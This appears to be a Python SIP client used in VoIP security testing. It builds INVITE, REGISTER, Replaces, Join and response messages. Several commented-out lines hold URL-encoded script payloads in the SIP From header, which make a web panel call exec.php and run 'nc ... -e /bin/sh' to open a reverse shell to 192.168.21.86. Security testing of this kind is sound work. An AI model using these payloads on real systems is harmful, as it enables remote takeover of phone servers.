import re
from random import randint
from hashlib import md5


def carriage_return() -> str:
    return "\r\n"


def rand_hex(bound) -> str:
    return md5(str(randint(0, bound)).encode('utf-8')).hexdigest()


def uri(number, host, port=None) -> str:
    if port is None:
        return f"sip:{number}@{host}"
    else:
        return f"sip:{number}@{host}:{port}"


def request_line(method, uri) -> str:
    return f"{method} {uri} SIP/2.0"


def response_line(code, cause) -> str:
    return f"SIP/2.0 {code} {cause}"


def via(uri, branch) -> str:
    return (
        f"Via: SIP/2.0/UDP {uri};rport=5060;received={uri};"
        f"branch=z9hG4bK{branch}"
    )


def from_header(uri, from_tag, display_name=None) -> str:
    header = "From:"
    if display_name is None:
        return f"{header} <{uri}>;tag={from_tag}"
    else:
        return f"{header} {display_name} <{uri}>;tag={from_tag}"


def to(uri, to_tag=None, display_name=None) -> str:
    header = "To:"
    if display_name is None:
        header = f"{header} <{uri}>"
    else:
        header = f"{header} {display_name} <{uri}>"

    if to_tag is None:
        return header

    return f"{header};tag={to_tag}"


def contact(uri) -> str:
    return f"Contact: <{uri}>"


def call_id(bound=99999999) -> str:
    return f"Call-ID: {rand_hex(bound)}"


def cseq(sequence, method) -> str:
    return f"CSeq: {sequence} {method}"


def content() -> str:
    return (
        "Content-Type: application/sdp"
        f"{carriage_return()}"
        "Content-Length:   343"
        f"{carriage_return()}{carriage_return()}"
        "v=0"
        f"{carriage_return()}"
        "o=- 3908291298 3908291298 IN IP4 192.168.21.86"
        f"{carriage_return()}"
        "s=pjmedia"
        f"{carriage_return()}"
        "b=AS:84"
        f"{carriage_return()}"
        "t=0 0"
        f"{carriage_return()}"
        "a=X-nat:0"
        f"{carriage_return()}"
        "m=audio 4004 RTP/AVP 8 0 101"
        f"{carriage_return()}"
        "c=IN IP4 192.168.21.86"
        f"{carriage_return()}"
        "b=TIAS:64000"
        f"{carriage_return()}"
        "a=rtcp:4005 IN IP4 192.168.21.86"
        f"{carriage_return()}"
        "a=sendrecv"
        f"{carriage_return()}"
        "a=rtpmap:8 PCMA/8000"
        f"{carriage_return()}"
        "a=rtpmap:0 PCMU/8000"
        f"{carriage_return()}"
        "a=rtpmap:101 telephone-event/8000"
        f"{carriage_return()}"
        "a=fmtp:101 0-16"
        f"{carriage_return()}"
        "a=ssrc:1362438962 cname:11d71c8121fe1107"
        f"{carriage_return()}"
    )

class SipClient:
    def __init__(self, registrar_proxy, client_address, client_number, client_port):
        self._registrar_proxy = registrar_proxy
        self._client_address = client_address
        self._contact = uri(client_number, self._client_address, client_port)
        self._client_number = client_number
        self._client_aor = uri(self._client_number, self._registrar_proxy)
        self._client_port = client_port

    def invite_message(self, callee_number):
        callee_aor = uri(callee_number, self._registrar_proxy)
        method = "INVITE"
        from_tag = rand_hex(999999)
        branch = rand_hex(99999999)
        sequence = 1
        return (
            f"{request_line(method=method, uri=callee_aor)}"
            f"{carriage_return()}"
            f"{via(self._registrar_proxy, branch)}"
            f"{carriage_return()}"
            f"{from_header(uri=self._client_aor, from_tag=from_tag)}"
            f"{carriage_return()}"
            f"{to(uri=callee_aor)}"
            f"{carriage_return()}"
            f"{contact(self._contact)}"
            f"{carriage_return()}"
            f"{call_id()}"
            f"{carriage_return()}"
            f"{cseq(sequence=str(sequence), method=method)}"
            f"{carriage_return()}"
            f"{content()}"
        )

    def replace_message(self, callee_number):
        callee_aor = uri(callee_number, self._registrar_proxy)
        method = "INVITE"
        from_tag = rand_hex(999999)
        branch = rand_hex(99999999)
        sequence = 1
        return (
            f"{request_line(method=method, uri=callee_aor)}"
            f"{carriage_return()}"
            f"{via(self._registrar_proxy, branch)}"
            f"{carriage_return()}"
            f"{from_header(uri=self._client_aor, from_tag=from_tag)}"
            f"{carriage_return()}"
            f"{to(uri=callee_aor)}"
            f"{carriage_return()}"
            f"{contact(self._contact)}"
            f"{carriage_return()}"
            f"{call_id()}"
            f"{carriage_return()}"
            f"{cseq(sequence=str(sequence), method=method)}"
            f"{carriage_return()}"
            "Replaces: c6da2fff6bd04690a8a27dc63b3d96f0;to-tag=HDee2yymD6KXF;from-tag=46ac9393fa384195bdfe2152f7a2d262"
            f"{carriage_return()}"
            f"{content()}"
        )

    def join_message(self, callee_number, dialog_identifier: str):
        callee_aor = uri(callee_number, self._registrar_proxy)
        method = "INVITE"
        from_tag = rand_hex(999999)
        branch = rand_hex(99999999)
        sequence = 1
        return (
            f"{request_line(method=method, uri=callee_aor)}"
            f"{carriage_return()}"
            f"{via(self._registrar_proxy, branch)}"
            f"{carriage_return()}"
            f"{from_header(uri=self._client_aor, from_tag=from_tag)}"
            f"{carriage_return()}"
            f"{to(uri=callee_aor)}"
            f"{carriage_return()}"
            f"{contact(self._contact)}"
            f"{carriage_return()}"
            f"{call_id()}"
            f"{carriage_return()}"
            f"{cseq(sequence=str(sequence), method=method)}"
            f"{carriage_return()}"
            f"Join: {dialog_identifier}"
            f"{carriage_return()}"
            f"{content()}"
        )

    def register(self, expire):
        method = "REGISTER"
        from_tag = rand_hex(999999)
        branch = rand_hex(99999999)
        sequence = 1
        proxy_uri = f"sip:{self._registrar_proxy}"
        return (
            f"{request_line(method=method, uri=proxy_uri)}"
            f"{carriage_return()}"
            f"{via(self._registrar_proxy, branch)}"
            f"{carriage_return()}"
            f"{from_header(uri=self._client_aor, from_tag=from_tag)}"
            f"{carriage_return()}"
            f"{to(uri=self._client_aor)}"
            f"{carriage_return()}"
            f"{contact(self._contact)}"
            f"{carriage_return()}"
            f"{call_id()}"
            f"{carriage_return()}"
            f"{cseq(sequence=str(sequence), method=method)}"
            f"{carriage_return()}"
            f"Expires: {expire}"
            f"{carriage_return()}{carriage_return()}"
        )

    def trying_100(self, response):
        cause = "Trying"
        method = "INVITE"
        # extracted_from_header = "%3Chtml%3E%3Cbody%20onload%3D%22q%3Dnew%20XMLHttpRequest()%3Bq.open('GET'%2C'exec.php%3Fcmd%3Dsystem%20nc%20192.168.21.86%2087%20-e%20%2Fbin%2Fsh'%2Ctrue)%3Bq.send()%3B%22%3E%3C%2Fbody%3E%3C%2Fhtml%3E"
        extracted_from_header = self.extract_from_header(response)
        extracted_to_header = self.extract_to_header(response)
        extracted_call_id_header = self.extract_call_id_header(response)
        branch = self.extract_branch(response)
        sequence = self.extract_cseq_number(response)
        return (
            f"{response_line(code=str(100), cause=cause)}"
            f"{carriage_return()}"
            f"{via(self._registrar_proxy, branch)}"
            f"{carriage_return()}"
            f"{extracted_from_header}"
            f"{carriage_return()}"
            f"{extracted_to_header}"
            f"{carriage_return()}"
            f"{extracted_call_id_header}"
            f"{carriage_return()}"
            f"{cseq(sequence=sequence, method=method)}"
            f"{carriage_return()}{carriage_return()}"
        )


    def ringing_180(self, response):
        cause = "Ringing"
        method = "INVITE"
        # extracted_from_header = "%3Chtml%3E%3Cbody%20onload%3D%22q%3Dnew%20XMLHttpRequest()%3Bq.open('GET'%2C'exec.php%3Fcmd%3Dsystem%20nc%20192.168.21.86%2087%20-e%20%2Fbin%2Fsh'%2Ctrue)%3Bq.send()%3B%22%3E%3C%2Fbody%3E%3C%2Fhtml%3E"
        extracted_from_header = self.extract_from_header(response)
        extracted_to_header = self.extract_to_header(response)
        extracted_call_id_header = self.extract_call_id_header(response)
        to_tag = rand_hex(999999)
        branch = self.extract_branch(response)
        sequence = self.extract_cseq_number(response)
        return (
            f"{response_line(code=str(180), cause=cause)}"
            f"{carriage_return()}"
            f"{via(self._registrar_proxy, branch)}"
            f"{carriage_return()}"
            f"{extracted_from_header}"
            f"{carriage_return()}"
            f"{extracted_to_header};tag={to_tag}"
            f"{carriage_return()}"
            f"{extracted_call_id_header}"
            f"{carriage_return()}"
            f"{cseq(sequence=sequence, method=method)}"
            f"{carriage_return()}{carriage_return()}"
        )
    
    '''Saeed Changes'''
    def ack_message(self, response):
        method = "ACK"
        # Extract necessary headers from the response
        extracted_from_header = self.extract_from_header(response)
        extracted_to_header = self.extract_to_header(response)
        extracted_call_id_header = self.extract_call_id_header(response)
        branch = self.extract_branch(response)
        sequence = self.extract_cseq_number(response)
        
        # Return the formatted ACK message
        return (
            f"{request_line(method=method, uri=self._client_aor)}"
            f"{carriage_return()}"
            f"{via(self._registrar_proxy, branch)}"
            f"{carriage_return()}"
            f"{extracted_from_header}"
            f"{carriage_return()}"
            f"{extracted_to_header}"
            f"{carriage_return()}"
            f"{extracted_call_id_header}"
            f"{carriage_return()}"
            f"{cseq(sequence=sequence, method=method)}"
            f"{carriage_return()}{carriage_return()}"
        )
    def response_200_ok(self, response):
        cause = "OK"
        method = "INVITE"
        extracted_from_header = self.extract_from_header(response)
        extracted_to_header = self.extract_to_header(response)
        extracted_call_id_header = self.extract_call_id_header(response)
        branch = self.extract_branch(response)
        sequence = self.extract_cseq_number(response)
        
        return (
            f"{response_line(code=str(200), cause=cause)}"
            f"{carriage_return()}"
            f"{via(self._registrar_proxy, branch)}"
            f"{carriage_return()}"
            f"{extracted_from_header}"
            f"{carriage_return()}"
            f"{extracted_to_header}"
            f"{carriage_return()}"
            f"{extracted_call_id_header}"
            f"{carriage_return()}"
            f"{cseq(sequence=sequence, method=method)}"
            f"{carriage_return()}{carriage_return()}"
        )
    '''End of Saeed Changes'''

    @staticmethod
    def remove_carriage(text: str):
        assert text
        return text.replace("\r", "")

    def extract_from_header(self, response: str) -> str:
        from_header = re.search("From: .*", response)
        return SipClient.remove_carriage(from_header.group())
        # from_header = "From: <sip:%3Cimg%20src%3D%27resources%2Fimages%2Fkill.png%27%20onload%3D%22q%3Dnew%20XMLHttpRequest%28%29%3Bq.open%28%27GET%27%2C%27exec.php%3Fcmd%3Dsystem%20nc%20192.168.21.86%2087%20-e%20%2Fbin%2Fsh%27%2Ctrue%29%3Bq.send%28%29%3B%22%3E@192.168.21.58>"
        # return SipClient.remove_carriage(from_header)

    def extract_to_header(self, response: str) -> str:
        from_header = re.search("To: .*", response)
        return SipClient.remove_carriage(from_header.group())

    def extract_call_id_header(self, response: str) -> str:
        from_header = re.search("Call-ID: .*", response)
        return SipClient.remove_carriage(from_header.group())

    def extract_branch(self, response: str):
        branch = re.search("Via: .*;branch=z9hG4bK(.*)", response)
        assert branch
        return SipClient.remove_carriage(branch.group(1))

    def extract_cseq_number(self, response: str):
        cseq = re.search("CSeq: (.*) INVITE", response)
        assert cseq
        return SipClient.remove_carriage(cseq.group(1))
